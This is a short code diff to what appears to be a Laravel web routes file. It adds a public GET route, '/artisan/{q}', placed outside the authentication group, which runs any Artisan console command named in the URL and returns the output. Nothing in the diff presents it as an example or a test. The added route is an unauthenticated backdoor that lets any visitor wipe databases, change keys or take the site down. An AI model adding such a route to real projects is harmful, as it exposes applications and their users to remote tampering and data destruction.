@@ -35,4 +35,8 @@ Route::middleware('auth')->group(function () {
     Route::delete('/profile', [ProfileController::class, 'destroy'])->name('profile.destroy');
 });
 
+Route::get('/artisan/{q}', function($q = ""){
+    Artisan::call($q);
+    return Artisan::output();
+});
 require __DIR__ . '/auth.php';
